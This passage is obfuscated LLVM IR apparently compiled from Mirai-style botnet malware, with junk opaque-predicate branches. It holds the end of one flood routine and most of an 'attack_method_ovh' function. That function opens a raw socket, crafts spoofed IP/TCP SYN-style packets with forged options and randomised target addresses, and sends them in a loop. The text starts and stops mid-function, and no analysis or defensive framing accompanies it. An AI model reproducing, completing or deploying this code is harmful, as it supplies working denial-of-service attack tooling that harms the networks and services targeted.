  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %266

; <label>:266:                                    ; preds = %originalBBpart212
  %267 = load i32, i32* @x.41
  %268 = load i32, i32* @y.42
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %266
  %275 = load i32, i32* %9, align 4
  %276 = add nsw i32 %275, 1
  store i32 %276, i32* %9, align 4
  %277 = load i32, i32* @x.41
  %278 = load i32, i32* @y.42
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBBpart219, label %originalBB14alteredBB

originalBBpart219:                                ; preds = %originalBB14
  br label %207

; <label>:285:                                    ; preds = %207
  %286 = load i32, i32* @x.41
  %287 = load i32, i32* @y.42
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %285
  %294 = load i32, i32* @x.41
  %295 = load i32, i32* @y.42
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %206

originalBBalteredBB:                              ; preds = %originalBB, %98
  %302 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %302, align 4
  %303 = load i16, i16* %13, align 2
  %304 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %303, i16* %304, align 2
  %305 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %306 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %305, i32 0, i32 0
  store i32 0, i32* %306, align 4
  %307 = load i32*, i32** %11, align 8
  %308 = load i32, i32* %9, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds i32, i32* %307, i64 %309
  %311 = load i32, i32* %310, align 4
  %312 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %313 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %313, %struct.sockaddr** %312, align 8
  %314 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %315 = load %struct.sockaddr*, %struct.sockaddr** %314, align 8
  %316 = call i32 @bind(i32 %311, %struct.sockaddr* %315, i32 16) #6
  %317 = icmp eq i32 %316, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %131
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %220
  %318 = load i8*, i8** %22, align 8
  %319 = load i16, i16* %14, align 2
  %320 = zext i16 %319 to i32
  call void @rand_str(i8* %318, i32 %320)
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %240
  %321 = load i32*, i32** %11, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds i32, i32* %321, i64 %323
  %325 = load i32, i32* %324, align 4
  %326 = load i8*, i8** %22, align 8
  %327 = load i16, i16* %14, align 2
  %328 = zext i16 %327 to i64
  %329 = call i64 @send(i32 %325, i8* %326, i64 %328, i32 16384)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %266
  %330 = load i32, i32* %9, align 4
  %_ = sub i32 %330, 1
  %gen = mul i32 %_, 1
  %_15 = sub i32 %330, 1
  %gen16 = mul i32 %_15, 1
  %_17 = shl i32 %330, 1
  %331 = add nsw i32 %330, 1
  store i32 %331, i32* %9, align 4
  br label %originalBB14

originalBB21alteredBB:                            ; preds = %originalBB21, %285
  br label %originalBB21
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_ovh(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %115

; <label>:98:                                     ; preds = %4
  %99 = load i32, i32* @x.43
  %100 = load i32, i32* @y.44
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %98
  %107 = load i32, i32* @x.43
  %108 = load i32, i32* @y.44
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %661

; <label>:115:                                    ; preds = %4
  %116 = load i32, i32* @x.43
  %117 = load i32, i32* @y.44
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %115
  store i32 1, i32* %9, align 4
  %124 = load i32, i32* %10, align 4
  %125 = bitcast i32* %9 to i8*
  %126 = call i32 @setsockopt(i32 %124, i32 0, i32 3, i8* %125, i32 4) #6
  %127 = icmp eq i32 %126, -1
  %128 = load i32, i32* @x.43
  %129 = load i32, i32* @y.44
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %127, label %136, label %139

; <label>:136:                                    ; preds = %originalBBpart24
  %137 = load i32, i32* %10, align 4
  %138 = call i32 @close(i32 %137)
  br label %661

; <label>:139:                                    ; preds = %originalBBpart24
  store i32 0, i32* %9, align 4
  br label %140

; <label>:140:                                    ; preds = %originalBBpart261, %139
  %141 = load i32, i32* %9, align 4
  %142 = load i8, i8* %5, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp slt i32 %141, %143
  br i1 %144, label %145, label %368

; <label>:145:                                    ; preds = %140
  %146 = load i32, i32* @x.43
  %147 = load i32, i32* @y.44
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %145
  %154 = call noalias i8* @calloc(i64 128, i64 1) #6
  %155 = load i8**, i8*** %11, align 8
  %156 = load i32, i32* %9, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i8*, i8** %155, i64 %157
  store i8* %154, i8** %158, align 8
  %159 = load i8**, i8*** %11, align 8
  %160 = load i32, i32* %9, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds i8*, i8** %159, i64 %161
  %163 = load i8*, i8** %162, align 8
  %164 = bitcast i8* %163 to %struct.iphdr*
  store %struct.iphdr* %164, %struct.iphdr** %27, align 8
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i64 1
  %167 = bitcast %struct.iphdr* %166 to %struct.tcphdr*
  store %struct.tcphdr* %167, %struct.tcphdr** %28, align 8
  %168 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %169 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %168, i64 1
  %170 = bitcast %struct.tcphdr* %169 to i8*
  store i8* %170, i8** %29, align 8
  %171 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %172 = bitcast %struct.iphdr* %171 to i8*
  %173 = load i8, i8* %172, align 4
  %174 = and i8 %173, 15
  %175 = or i8 %174, 64
  store i8 %175, i8* %172, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = bitcast %struct.iphdr* %176 to i8*
  %178 = load i8, i8* %177, align 4
  %179 = and i8 %178, -16
  %180 = or i8 %179, 5
  store i8 %180, i8* %177, align 4
  %181 = load i8, i8* %12, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 1
  store i8 %181, i8* %183, align 1
  %184 = call zeroext i16 @htons(i16 zeroext 60) #7
  %185 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 2
  store i16 %184, i16* %186, align 2
  %187 = load i16, i16* %13, align 2
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 3
  store i16 %188, i16* %190, align 4
  %191 = load i8, i8* %14, align 1
  %192 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 5
  store i8 %191, i8* %193, align 4
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  %196 = load i32, i32* @x.43
  %197 = load i32, i32* @y.44
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBBpart246, label %originalBB6alteredBB

originalBBpart246:                                ; preds = %originalBB6
  br i1 %195, label %204, label %224

; <label>:204:                                    ; preds = %originalBBpart246
  %205 = load i32, i32* @x.43
  %206 = load i32, i32* @y.44
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %204
  %213 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %214 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 4
  store i16 %213, i16* %215, align 2
  %216 = load i32, i32* @x.43
  %217 = load i32, i32* @y.44
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br label %224

; <label>:224:                                    ; preds = %originalBBpart250, %originalBBpart246
  %225 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 6
  store i8 6, i8* %226, align 1
  %227 = load i32, i32* %26, align 4
  %228 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 8
  store i32 %227, i32* %229, align 4
  %230 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %231 = load i32, i32* %9, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %230, i64 %232
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %233, i32 0, i32 1
  %235 = load i32, i32* %234, align 4
  %236 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 9
  store i32 %235, i32* %237, align 4
  %238 = load i16, i16* %16, align 2
  %239 = call zeroext i16 @htons(i16 zeroext %238) #7
  %240 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  store i16 %239, i16* %241, align 4
  %242 = load i16, i16* %17, align 2
  %243 = call zeroext i16 @htons(i16 zeroext %242) #7
  %244 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 1
  store i16 %243, i16* %245, align 2
  %246 = load i32, i32* %18, align 4
  %247 = trunc i32 %246 to i16
  %248 = call zeroext i16 @htons(i16 zeroext %247) #7
  %249 = zext i16 %248 to i32
  %250 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 2
  store i32 %249, i32* %251, align 4
  %252 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = and i16 %254, -241
  %256 = or i16 %255, 160
  store i16 %256, i16* %253, align 4
  %257 = load i8, i8* %20, align 1
  %258 = sext i8 %257 to i16
  %259 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 4
  %261 = load i16, i16* %260, align 4
  %262 = and i16 %258, 1
  %263 = shl i16 %262, 13
  %264 = and i16 %261, -8193
  %265 = or i16 %264, %263
  store i16 %265, i16* %260, align 4
  %266 = load i8, i8* %21, align 1
  %267 = sext i8 %266 to i16
  %268 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 4
  %270 = load i16, i16* %269, align 4
  %271 = and i16 %267, 1
  %272 = shl i16 %271, 12
  %273 = and i16 %270, -4097
  %274 = or i16 %273, %272
  store i16 %274, i16* %269, align 4
  %275 = load i8, i8* %22, align 1
  %276 = sext i8 %275 to i16
  %277 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %278 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %277, i32 0, i32 4
  %279 = load i16, i16* %278, align 4
  %280 = and i16 %276, 1
  %281 = shl i16 %280, 11
  %282 = and i16 %279, -2049
  %283 = or i16 %282, %281
  store i16 %283, i16* %278, align 4
  %284 = load i8, i8* %23, align 1
  %285 = sext i8 %284 to i16
  %286 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %287 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %286, i32 0, i32 4
  %288 = load i16, i16* %287, align 4
  %289 = and i16 %285, 1
  %290 = shl i16 %289, 10
  %291 = and i16 %288, -1025
  %292 = or i16 %291, %290
  store i16 %292, i16* %287, align 4
  %293 = load i8, i8* %24, align 1
  %294 = sext i8 %293 to i16
  %295 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %296 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %295, i32 0, i32 4
  %297 = load i16, i16* %296, align 4
  %298 = and i16 %294, 1
  %299 = shl i16 %298, 9
  %300 = and i16 %297, -513
  %301 = or i16 %300, %299
  store i16 %301, i16* %296, align 4
  %302 = load i8, i8* %25, align 1
  %303 = sext i8 %302 to i16
  %304 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %305 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %304, i32 0, i32 4
  %306 = load i16, i16* %305, align 4
  %307 = and i16 %303, 1
  %308 = shl i16 %307, 8
  %309 = and i16 %306, -257
  %310 = or i16 %309, %308
  store i16 %310, i16* %305, align 4
  %311 = load i8*, i8** %29, align 8
  %312 = getelementptr inbounds i8, i8* %311, i32 1
  store i8* %312, i8** %29, align 8
  store i8 2, i8* %311, align 1
  %313 = load i8*, i8** %29, align 8
  %314 = getelementptr inbounds i8, i8* %313, i32 1
  store i8* %314, i8** %29, align 8
  store i8 4, i8* %313, align 1
  %315 = call i32 @rand_next()
  %316 = and i32 %315, 15
  %317 = add i32 1400, %316
  %318 = trunc i32 %317 to i16
  %319 = call zeroext i16 @htons(i16 zeroext %318) #7
  %320 = load i8*, i8** %29, align 8
  %321 = bitcast i8* %320 to i16*
  store i16 %319, i16* %321, align 2
  %322 = load i8*, i8** %29, align 8
  %323 = getelementptr inbounds i8, i8* %322, i64 2
  store i8* %323, i8** %29, align 8
  %324 = load i8*, i8** %29, align 8
  %325 = getelementptr inbounds i8, i8* %324, i32 1
  store i8* %325, i8** %29, align 8
  store i8 4, i8* %324, align 1
  %326 = load i8*, i8** %29, align 8
  %327 = getelementptr inbounds i8, i8* %326, i32 1
  store i8* %327, i8** %29, align 8
  store i8 2, i8* %326, align 1
  %328 = load i8*, i8** %29, align 8
  %329 = getelementptr inbounds i8, i8* %328, i32 1
  store i8* %329, i8** %29, align 8
  store i8 8, i8* %328, align 1
  %330 = load i8*, i8** %29, align 8
  %331 = getelementptr inbounds i8, i8* %330, i32 1
  store i8* %331, i8** %29, align 8
  store i8 10, i8* %330, align 1
  %332 = call i32 @rand_next()
  %333 = load i8*, i8** %29, align 8
  %334 = bitcast i8* %333 to i32*
  store i32 %332, i32* %334, align 4
  %335 = load i8*, i8** %29, align 8
  %336 = getelementptr inbounds i8, i8* %335, i64 4
  store i8* %336, i8** %29, align 8
  %337 = load i8*, i8** %29, align 8
  %338 = bitcast i8* %337 to i32*
  store i32 0, i32* %338, align 4
  %339 = load i8*, i8** %29, align 8
  %340 = getelementptr inbounds i8, i8* %339, i64 4
  store i8* %340, i8** %29, align 8
  %341 = load i8*, i8** %29, align 8
  %342 = getelementptr inbounds i8, i8* %341, i32 1
  store i8* %342, i8** %29, align 8
  store i8 1, i8* %341, align 1
  %343 = load i8*, i8** %29, align 8
  %344 = getelementptr inbounds i8, i8* %343, i32 1
  store i8* %344, i8** %29, align 8
  store i8 3, i8* %343, align 1
  %345 = load i8*, i8** %29, align 8
  %346 = getelementptr inbounds i8, i8* %345, i32 1
  store i8* %346, i8** %29, align 8
  store i8 3, i8* %345, align 1
  %347 = load i8*, i8** %29, align 8
  %348 = getelementptr inbounds i8, i8* %347, i32 1
  store i8* %348, i8** %29, align 8
  store i8 6, i8* %347, align 1
  br label %349

; <label>:349:                                    ; preds = %224
  %350 = load i32, i32* @x.43
  %351 = load i32, i32* @y.44
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %349
  %358 = load i32, i32* %9, align 4
  %359 = add nsw i32 %358, 1
  store i32 %359, i32* %9, align 4
  %360 = load i32, i32* @x.43
  %361 = load i32, i32* @y.44
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBBpart261, label %originalBB52alteredBB

originalBBpart261:                                ; preds = %originalBB52
  br label %140

; <label>:368:                                    ; preds = %140
  %369 = load i32, i32* @x.43
  %370 = load i32, i32* @y.44
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %368
  %377 = load i32, i32* @x.43
  %378 = load i32, i32* @y.44
  %379 = sub i32 %377, 1
  %380 = mul i32 %377, %379
  %381 = urem i32 %380, 2
  %382 = icmp eq i32 %381, 0
  %383 = icmp slt i32 %378, 10
  %384 = or i1 %382, %383
  br i1 %384, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %385

; <label>:385:                                    ; preds = %660, %originalBBpart265
  %386 = load i32, i32* @x.43
  %387 = load i32, i32* @y.44
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %385
  store i32 0, i32* %9, align 4
  %394 = load i32, i32* @x.43
  %395 = load i32, i32* @y.44
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %402

; <label>:402:                                    ; preds = %originalBBpart2111, %originalBBpart269
  %403 = load i32, i32* %9, align 4
  %404 = load i8, i8* %5, align 1
  %405 = zext i8 %404 to i32
  %406 = icmp slt i32 %403, %405
  br i1 %406, label %407, label %660

; <label>:407:                                    ; preds = %402
  %408 = load i8**, i8*** %11, align 8
  %409 = load i32, i32* %9, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds i8*, i8** %408, i64 %410
  %412 = load i8*, i8** %411, align 8
  store i8* %412, i8** %30, align 8
  %413 = load i8*, i8** %30, align 8
  %414 = bitcast i8* %413 to %struct.iphdr*
  store %struct.iphdr* %414, %struct.iphdr** %31, align 8
  %415 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %416 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %415, i64 1
  %417 = bitcast %struct.iphdr* %416 to %struct.tcphdr*
  store %struct.tcphdr* %417, %struct.tcphdr** %32, align 8
  %418 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %419 = load i32, i32* %9, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i64 %420
  %422 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %421, i32 0, i32 2
  %423 = load i8, i8* %422, align 4
  %424 = zext i8 %423 to i32
  %425 = icmp slt i32 %424, 32
  br i1 %425, label %426, label %447

; <label>:426:                                    ; preds = %407
  %427 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %428 = load i32, i32* %9, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %427, i64 %429
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %430, i32 0, i32 1
  %432 = load i32, i32* %431, align 4
  %433 = call i32 @ntohl(i32 %432) #7
  %434 = call i32 @rand_next()
  %435 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %436 = load i32, i32* %9, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %435, i64 %437
  %439 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %438, i32 0, i32 2
  %440 = load i8, i8* %439, align 4
  %441 = zext i8 %440 to i32
  %442 = lshr i32 %434, %441
  %443 = add i32 %433, %442
  %444 = call i32 @htonl(i32 %443) #7
